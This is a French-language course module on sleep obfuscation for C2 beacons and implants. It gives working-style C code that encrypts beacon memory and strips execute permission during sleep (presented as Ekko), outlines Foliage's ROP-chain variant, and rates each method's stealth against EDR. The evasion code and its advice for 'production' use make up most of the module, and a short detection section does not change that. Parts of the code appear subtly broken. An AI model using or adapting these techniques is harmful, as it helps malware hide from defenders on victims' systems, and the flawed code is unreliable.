# Module W38 : Sleep Obfuscation - Ekko, Foliage et Chiffrement Mémoire

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre pourquoi le sleep est un indicateur de compromission
- Implémenter Ekko (sleep encryption via timers)
- Maîtriser Foliage (sleep avec ROP gadgets)
- Chiffrer la mémoire de votre beacon pendant le sleep

## 1. Le Problème du Sleep

### 1.1 Pourquoi sleep est dangereux ?

**Scénario typique d'un beacon/implant** :
```c
while (1) {
    // 1. Contacte le C2
    CheckIn();

    // 2. Exécute les tâches
    ExecuteTasks();

    // 3. SLEEP pendant X secondes
    Sleep(60000);  // 60 secondes
}
```

**Problèmes** :
1. **Mémoire RWX persistante** : Beacon/shellcode visible en RWX pendant le sleep
2. **Scans périodiques** : EDR/AV scannent la mémoire pendant les périodes d'inactivité
3. **Détection comportementale** : Processus qui sleep régulièrement = suspect

### 1.2 Schéma de détection

```
Timeline d'un beacon malveillant
═════════════════════════════════

T+0s     : Beacon s'exécute (actif)
T+5s     : Beacon entre en sleep (60s)
         │
         ├──► EDR Memory Scanner
         │    ├─ Scan des régions RWX
         │    ├─ Détecte shellcode non chiffré
         │    └─ ALERTE! Beacon détecté
         │
T+65s    : Beacon se réveille (trop tard, déjà bloqué)
```

## 2. Ekko - Sleep Encryption via Timers

### 2.1 Principe

**Ekko** utilise les timers Windows (CreateWaitableTimer) pour chiffrer le beacon avant le sleep et le déchiffrer au réveil.

**Flux Ekko** :
```
1. Avant Sleep
   ├─► Créer un timer (CreateWaitableTimer)
   ├─► Chiffrer toutes les régions RWX du beacon (XOR/AES)
   ├─► Changer permissions en RW (enlever X)
   ├─► Attacher callback au timer (ROP chain)
   └─► Attendre le timer

2. Pendant Sleep
   ├─► Beacon chiffré en mémoire
   ├─► Pas de régions RWX
   └─► Invisible aux scans mémoire

3. Après Sleep (timer expir é)
   ├─► Callback du timer s'exécute
   ├─► Déchiffre le beacon
   ├─► Restaure permissions RWX
   └─► Reprend l'exécution normale
```

### 2.2 Implémentation Ekko

```c
#include <windows.h>
#include <stdio.h>

// Contexte pour le callback du timer
typedef struct _EKKO_CONTEXT {
    PVOID beaconBase;        // Adresse de base du beacon
    SIZE_T beaconSize;       // Taille du beacon
    BYTE xorKey;             // Clé XOR simple (remplacer par AES en prod)
    DWORD originalProtect;   // Permissions originales
} EKKO_CONTEXT, *PEKKO_CONTEXT;

// Callback du timer (déchiffre et restaure)
VOID CALLBACK EkkoTimerCallback(
    PVOID lpParameter,
    BOOLEAN TimerOrWaitFired
) {
    PEKKO_CONTEXT ctx = (PEKKO_CONTEXT)lpParameter;

    printf("[*] Timer expiré, déchiffrement...\n");

    // 1. Changer permissions en RWX
    DWORD oldProtect;
    VirtualProtect(ctx->beaconBase, ctx->beaconSize,
                   PAGE_EXECUTE_READWRITE, &oldProtect);

    // 2. Déchiffrer (XOR simple - utiliser AES en production)
    BYTE* beacon = (BYTE*)ctx->beaconBase;
    for (SIZE_T i = 0; i < ctx->beaconSize; i++) {
        beacon[i] ^= ctx->xorKey;
    }

    printf("[+] Beacon déchiffré et restauré\n");

    // 3. Restaurer permissions originales
    VirtualProtect(ctx->beaconBase, ctx->beaconSize,
                   ctx->originalProtect, &oldProtect);
}

// Fonction de sleep obfusquée (Ekko)
BOOL EkkoSleep(PVOID beaconBase, SIZE_T beaconSize, DWORD sleepTimeMs) {
    printf("[*] Ekko Sleep pour %d ms\n", sleepTimeMs);

    // 1. Préparer le contexte
    EKKO_CONTEXT ctx = { 0 };
    ctx.beaconBase = beaconBase;
    ctx.beaconSize = beaconSize;
    ctx.xorKey = 0xAB;  // Clé XOR (simple pour la démo)

    // 2. Chiffrer le beacon
    printf("[*] Chiffrement du beacon...\n");

    DWORD oldProtect;
    if (!VirtualProtect(beaconBase, beaconSize,
                       PAGE_READWRITE, &oldProtect)) {
        printf("[-] Erreur VirtualProtect: %d\n", GetLastError());
        return FALSE;
    }

    ctx.originalProtect = oldProtect;

    BYTE* beacon = (BYTE*)beaconBase;
    for (SIZE_T i = 0; i < beaconSize; i++) {
        beacon[i] ^= ctx.xorKey;
    }

    printf("[+] Beacon chiffré\n");

    // Permissions RW (pas X) pendant le sleep
    VirtualProtect(beaconBase, beaconSize, PAGE_READWRITE, &oldProtect);

    // 3. Créer un timer waitable
    HANDLE hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
    if (!hTimer) {
        printf("[-] Erreur CreateWaitableTimer: %d\n", GetLastError());
        // Déchiffrer avant de retourner
        for (SIZE_T i = 0; i < beaconSize; i++) beacon[i] ^= ctx.xorKey;
        return FALSE;
    }

    // 4. Configurer le timer
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -(LONGLONG)sleepTimeMs * 10000LL;  // Négatif = relatif

    // 5. Enregistrer le callback
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hTimerQueueTimer = NULL;

    if (!CreateTimerQueueTimer(
        &hTimerQueueTimer,
        hTimerQueue,
        EkkoTimerCallback,
        &ctx,
        sleepTimeMs,
        0,  // Période (0 = one-shot)
        WT_EXECUTEINTIMERTHREAD
    )) {
        printf("[-] Erreur CreateTimerQueueTimer: %d\n", GetLastError());
        CloseHandle(hTimer);
        for (SIZE_T i = 0; i < beaconSize; i++) beacon[i] ^= ctx.xorKey;
        return FALSE;
    }

    printf("[+] Timer configuré, beacon en sommeil...\n");

    // 6. Attendre l'expiration du timer
    WaitForSingleObject(hTimerQueueTimer, INFINITE);

    // 7. Cleanup
    DeleteTimerQueueTimer(hTimerQueue, hTimerQueueTimer, NULL);
    DeleteTimerQueue(hTimerQueue);
    CloseHandle(hTimer);

    printf("[+] Ekko Sleep terminé\n");
    return TRUE;
}

// Exemple d'utilisation
int main() {
    // Simuler un beacon (shellcode en mémoire)
    unsigned char beacon[] = {
        0x48, 0x83, 0xEC, 0x28,  // Shellcode fictif
        0x48, 0x31, 0xC0,
        0xC3
    };

    SIZE_T beaconSize = sizeof(beacon);

    // Allouer en RWX
    PVOID beaconMem = VirtualAlloc(NULL, beaconSize,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    memcpy(beaconMem, beacon, beaconSize);

    printf("[*] Beacon allocsé à: 0x%p\n", beaconMem);

    // Simuler un cycle beacon
    for (int i = 0; i < 3; i++) {
        printf("\n=== Cycle %d ===\n", i + 1);

        // Exécution normale (check-in, tasks, etc.)
        printf("[*] Beacon actif (simulation)\n");
        Sleep(2000);

        // Sleep obfusqué
        EkkoSleep(beaconMem, beaconSize, 5000);  // 5 secondes
    }

    VirtualFree(beaconMem, 0, MEM_RELEASE);
    return 0;
}
```

## 3. Foliage - Sleep via ROP Gadgets

### 3.1 Principe

**Foliage** utilise une ROP chain pour :
1. Chiffrer le beacon
2. Faire un sleep "légitime"
3. Déchiffrer automatiquement au réveil (via ROP)

**Avantages** :
- Pas de callback suspect
- Utilise uniquement des gadgets ROP légitimes (ntdll, kernel32)
- Très furtif

### 3.2 Schéma Foliage

```
Stack avant sleep
┌────────────────────────────┐
│ ROP Gadget 1: VirtualProtect│ ─► Change en RW
│ ROP Gadget 2: Encrypt      │ ─► Chiffre le beacon
│ ROP Gadget 3: Sleep        │ ─► Sleep légitime
│ ROP Gadget 4: Decrypt      │ ─► Déchiffre
│ ROP Gadget 5: VirtualProtect│ ─► Restaure RWX
│ ROP Gadget 6: Resume       │ ─► Reprend exécution
└────────────────────────────┘
```

### 3.3 Implémentation simplifiée Foliage

```c
// ROP Chain pour Foliage
typedef struct _FOLIAGE_ROP_CHAIN {
    PVOID gadget1_VirtualProtect;
    PVOID gadget2_EncryptLoop;
    PVOID gadget3_Sleep;
    PVOID gadget4_DecryptLoop;
    PVOID gadget5_VirtualProtect;
    PVOID gadget6_Resume;
} FOLIAGE_ROP_CHAIN;

// Note: Implémentation complète nécessite recherche de gadgets
// dans ntdll/kernel32 (hors scope de cette démo)
```

## 4. Comparaison des Techniques

```
Technique       │ Stealth │ Complexité │ Détection │ Fiabilité
────────────────┼─────────┼────────────┼───────────┼──────────
Sleep() classic │    ★    │     ★      │  Élevée   │  ★★★★★
Ekko            │  ★★★★   │    ★★★     │  Faible   │   ★★★★
Foliage         │ ★★★★★   │   ★★★★★    │Très Faible│    ★★★
```

## 5. Détection et Mitigations

**IOCs** :
- Appels fréquents à VirtualProtect avant/après sleep
- Créations de timers avec callbacks vers mémoire non-module
- Patterns de chiffrement/déchiffrement cycliques

**Mitigations EDR** :
- Monitoring des changements de permissions mémoire
- Analyse des call stacks lors des callbacks
- Détection de ROP chains

## 6. Checklist

- [ ] Je comprends pourquoi le sleep est dangereux
- [ ] Je sais implémenter Ekko
- [ ] Je connais le principe de Foliage
- [ ] Je peux chiffrer/déchiffrer de la mémoire

## Exercices

Voir [exercice.md](exercice.md)

---

**Navigation**
- [Module précédent : W37 ETW Bypass](../W37_etw_bypass/)
- [Module suivant : W39 Memory Evasion](../W39_memory_evasion/)
